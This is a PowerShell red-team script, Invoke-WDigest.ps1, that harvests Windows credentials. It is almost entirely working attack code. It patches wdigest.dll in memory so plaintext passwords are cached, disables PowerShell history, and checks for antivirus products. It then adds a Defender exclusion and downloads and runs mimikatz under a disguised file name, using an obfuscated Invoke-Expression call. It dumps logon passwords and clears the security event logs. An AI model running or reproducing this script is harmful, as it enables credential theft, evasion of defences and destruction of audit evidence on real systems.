﻿<#
.SYNOPSIS
   WDigest credential caching [Memory]

   Author: @r00t-3xp10it
   Credits: @wh0nsq [BypassCredGuard.exe]
   Credits: @BenjaminDelpy [mi`mi`katz.exe]
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: Administrator privileges
   Optional Dependencies: WDigest, BypassCredGuard.exe
   PS cmdlet Dev version: v1.3.9
   
.DESCRIPTION
   WDigest stores clear-text passwords in memory. An adversary can use a tool like
   M[i]mika[t]z to get not just the hashes stored in memory, but the clear-text creds
   as well. As a result, they will not be limited to attacks like Pass-the-Hash, they
   also be able to log on to Exchange, internal web sites, and other resources that
   require entering a user ID and password.

.NOTES
   This module allow users to dump WDigest creds with M[i]mika[t]z without reboot or to
   spawn\execute M[i]mika[t]z trougth Windows defender ExclusionPath to bypass detection.

   To use M[i]mika[t]z interactive shell invoke -manycats switch with -module 'false' param (default)
   To use M[i]mika[t]z multiple::modules invoke -manycats with -module 'sekurlsa::wdigest event::clear'
   REMARK: This cmdlet only bypasses M[i]mika[t]z detection if Windows Defender its the only AV running.
   Remark: Cmdlet will clean eventvwr security logs if invoked -manycats together with -module parameter.

   -runas and -dcname are demonstration parameter switch's that promps user for credential
   input so that WDigest can store it in memory and M[i]mika[t]z can dump it later [demo]. 

.Parameter WDigest
   Activate WDigest credential caching in Memory? (default: true)

.Parameter Manycats
   Switch that downloads\executes M[i]mika[t]z to dump credentials

.Parameter RunAs
   Switch that promps user for credential input and store it in memory

.Parameter DcName
   Switch of RunAs command that accepts USER@DOMAIN or DOMAIN\USER form
   Remark: this function requires -RunAs parameter switch declaration

.Parameter Module
   M[i]mika[t]z selection of modules to run (default: sekurlsa::wdigest)

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'false' -manycats
   Execute M[i]mika[t]z (interactive shell) without WDigest caching

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'true' -manycats
   Ativate WDigest caching + Execute M[i]mika[t]z sekurlsa::wdigest

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'net::group sekurlsa::wdigest sekurlsa::logonpasswords exit'
   Ativate WDigest caching + Exec M[i]mika[t]z 'net::group sekurlsa::wdigest sekurlsa::logonpasswords' multiple Dump::Modules

.EXAMPLE
   PS C:\> .\Invoke-WDigest.ps1 -wdigest 'true' -manycats -runas
   [demo] This command allow us to invoke RunAs api [manual enter credential]
   and then use M[i]mika[t]z to dump WDigest recent stored credential [memory]

.INPUTS
   None. You cannot pipe objects into Invoke-WDigest.ps1

.OUTPUTS
   WDigest credential caching (Memory)
     - Privileges token: Administrator
     - DcUserName SKYNET\Administrator
     - Patching Wdigest.dll in Memory

   [*] Base address of wdigest.dll: 0x00007ffd4a670000
   [*] Matched signature at 0x00007ffd4a671c4b: 41 b5 01 85 c0
   [*] Address of g_fParameter_UseLogonCredential: 0x00007ffd4a6aa2e4
   [*] Address of g_IsCredGuardEnabled: 0x00007ffd4a6a9ca8
   [*] The current value of g_fParameter_UseLogonCredential is 0
   [*] Patched value of g_fParameter_UseLogonCredential to 1
   [*] The current value of g_IsCredGuardEnabled is 0
   [*] Patched value of g_IsCredGuardEnabled to 0

     - Creating %TMP% folder defender exclusion.
     - Downloading mi`mikat`z from github to %TMP%
     - Invoking mi`mikat`z sekurlsa::wdigest to dump creds.

    .#####.   mimi`kat`z 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
   .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
   ## \ / ##       > http://blog.gentilkiwi.com/mimi`kat`z
   '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

.LINK
   https://tools.thehacker.recipes/mimikatz/modules
   https://blog.xpnsec.com/exploring-mimikatz-part-1
   https://github.com/wh0nsq/BypassCredGuard/releases
   https://teamhydra.blog/2020/08/25/bypassing-credential-guard
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$DcName="${Env:COMPUTERNAME}\${Env:USERNAME}",
   [string]$WDigest="true",
   [string]$Module="false",
   [switch]$ManyCats,
   [switch]$RunAs
)


$CmdletVersion = "v1.3.9"
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
write-host "`nWDigest credential caching (Memory)" -ForegroundColor Green
$host.UI.RawUI.WindowTitle = "@DeviceGuard $CmdletVersion {SSA@RedTeam}"

## Make sure shell is running with administrator privileges
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
If($IsClientAdmin -iNotMatch '^(True)$')
{
   write-host "  - " -ForegroundColor Red -NoNewline
   write-host "Error: " -ForegroundColor DarkGray -NoNewline
   write-host "Administrator privileges required ..`n" -ForegroundColor Red
   return
}

$Regex = @(
   "superantispyware",
   "Spyware Doctor",
   "MalwareBytes",
   "Bitdefender",
   "Trend Micro",
   "Kaspersky",
   "Symantec",
   "f-secure",
   "FireEye",
   "WebRoot",
   "F-Prot",
   "McAfee",
   "Sophos",
   "Norton",
   "Nod32",
   "Avast",
   "GData",
   "Avira",
   "AVG"
)


$Ipath = $pwd
## Print OnScreen module information
write-host "  - " -ForegroundColor Red -NoNewline
write-host "Privileges token: " -NoNewline
write-host "Administrator" -ForegroundColor Red
Start-Sleep -Milliseconds 700
write-host "  - " -ForegroundColor Yellow -NoNewline
write-host "DcUserName $DcName"
Start-Sleep -Seconds 1


cd "$Env:TMP"
If($Wdigest -Match '^(true)$')
{
   write-host "  - " -ForegroundColor Yellow -NoNewline
   write-host "Patching Wdigest.dll in Memory`n"
   ## Download (from my github) and Execute the binary.exe
   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/BypassCredGuard.exe" -OutFile "BypassCredGuard.exe"|Unblock-File

   Try{
      .\BypassCredGuard.exe
   }Catch{write-host $_.Exception.Message -ForegroundColor Red;return}
}


write-host ""
If($ManyCats.IsPresent)
{
   ## Manual Login?
   If($RunAs.IsPresent)
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Execute RunAs Command!

      .NOTES
         Get-Credential module allows me to pause this cmdlet execution until
         one credential its inputed, then starts cmd.exe with suplied credential
         in a minimized windows (detach from parent). Child process its necessary
         for m[i]mika[t]z 'sekurlsa::wdigest' to dump the credential from Memory.

         [Downside] Cmdlet does not continue execution while the cred its not input.
         From one remote atacker point of view thats bad ( cmdlet execution paused )
      #>

      If([string]::IsNullOrEmpty($DcName))
      {
         ## Use 'default' DC name in case var its empty
         $DcName = "${Env:COMPUTERNAME}\${Env:USERNAME}"
      }
  
      ## Prompt user for credential
      $PlainTextCreds = Get-Credential
      Start-Process -WindowStyle minimized cmd.exe -Credential "$PlainTextCreds"
      write-host "`n"
   }

   $Testme = @()
   $Obfuscation = "mi`mi" + "kat`z" -join ''
   ## Enumerate Anti-Virus Proactive defense running
   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetCounterMeasures.ps1" -OutFile "$Env:TMP\GetCounterMeasures.ps1"|Unblock-File
   Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $Env:TMP\GetCounterMeasures.ps1 -logfile true" -Wait
   $AVNAME = (gci -Path "$Env:TMP"|?{$_ -Match '_CounterMeasures.log'}).FullName

   ForEach($Item in $Regex)
   {
      $Testme += Get-Content -path "$AVNAME"|Select-String -pattern "$Item"

      If($Testme -iMatch "$Item")
      {
         write-host "    [" -ForegroundColor Red -NoNewline
         write-host "$Item" -NoNewline
         write-host "] Disable proactive defense to run $Obfuscation.`n" -ForegroundColor Red
      }
   }

   ## CleanUP
   Remove-Item -Path "$AVNAME" -Force
   Remove-Item -Path "$Env:TMP\GetCounterMeasures.ps1" -Force

   If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
   {
      write-host "  - " -ForegroundColor Yellow -NoNewline
      write-host "Creating %TMP% folder defender exclusion."
      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "$Env:TMP\Invoke-Exclusions.ps1";
      Start-Process -WindowStyle Hidden powershell -ArgumentList "-file Invoke-Exclusions.ps1 -Action add -Type ExclusionPath -Exclude $Env:TMP" -Wait;   
      Start-Sleep -Seconds 1
   }

   write-host "  - " -ForegroundColor Yellow -NoNewline
   write-host "Downloading ${Obfuscation}.exe from github to %TMP%"

   ## Determining if system is 32 or 64 bit
   if($Env:PROCESSOR_ARCHITECTURE -eq "x86")
   {
      $GitHubParrotUri = "https://raw.githubusercontent.com/ParrotSec/${Obfuscation}/master/Win32/${Obfuscation}.exe"
   }
   Else
   {
      $GitHubParrotUri = "https://raw.githubusercontent.com/ParrotSec/${Obfuscation}/master/x64/${Obfuscation}.exe"
   }


   ## Download binary.exe from ParrotSec GitHub
   iwr -uri "$GitHubParrotUri" -OutFile "${Env:TMP}\manycats.msc"|Unblock-File

   write-host "  - " -ForegroundColor Yellow -NoNewline
   write-host "Invoking " -NoNewline
   write-host "${Obfuscation}" -ForegroundColor DarkYellow -NoNewline

   If($Wdigest -Match '^(true)$')
   {
      ## M[i]mika[t]z Dump::Modules manual selection.
      # net::group sekurlsa::wdigest sekurlsa::dpapi dpapi::cache
      # sekurlsa::logonpasswords vault::list event::clear exit
      If($Module -Match '^(false)$')
      {
         write-host " sekurlsa::wdigest" -ForegroundColor DarkYellow -NoNewline
         write-host " to dump creds.`n"
         &('xEx' -replace '^(x)','i') ".\manycats.msc sekurlsa::wdigest exit" 
      }
      Else
      {
         If($Module -iNotMatch 'event::clear')
         {
            $Module = "$Module" + " event::clear" -join ''
         }

         write-host " multiple modules.`n"
         &('xEx' -replace '^(x)','i') ".\manycats.msc $Module"       
      }     
   }
   Else
   {
      If($Module -Match '^(false)$')
      {
         write-host " interactive shell`n"
         &('xEx' -replace '^(x)','i') ".\manycats.msc"
      }
      Else
      {
         If($Module -iNotMatch 'event::clear')
         {
            $Module = "$Module" + " event::clear" -join ''
         }

         write-host " multiple modules.`n"
         &('xEx' -replace '^(x)','i') ".\manycats.msc $Module"      
      }
   }


   write-host ""
   ## Auto-CleanUp of artifacts left behind
   Remove-Item -Path "${Env:TMP}\manycats.msc" -Force
   If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
   {
      write-host "`n  - " -ForegroundColor Red -NoNewline
      write-host "Removing '" -NoNewline
      write-host "%TMP%" -ForegroundColor Red -NoNewline
      write-host "' exclusion from windows defender."

      Start-Process -WindowStyle Hidden powershell -ArgumentList "-file Invoke-Exclusions.ps1 -Action del -Type ExclusionPath -Exclude $Env:TMP" -Wait;
      Remove-Item -Path "$Env:TMP\Invoke-Exclusions.ps1" -Force
   }
}


## CleanUp
cd "$Ipath"
If($RunAs.IsPresent)
{
   Stop-Process -Name "cmd" -Force
}

If(Test-Path -Path "$Env:TMP\BypassCredGuard.exe")
{
   Remove-Item -Path "$Env:TMP\BypassCredGuard.exe" -Force
}

write-host "  - " -ForegroundColor Green -NoNewline
write-host "Module finished at: " -NoNewline
write-host "$(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Green -NoNewline
write-host " UTC`n"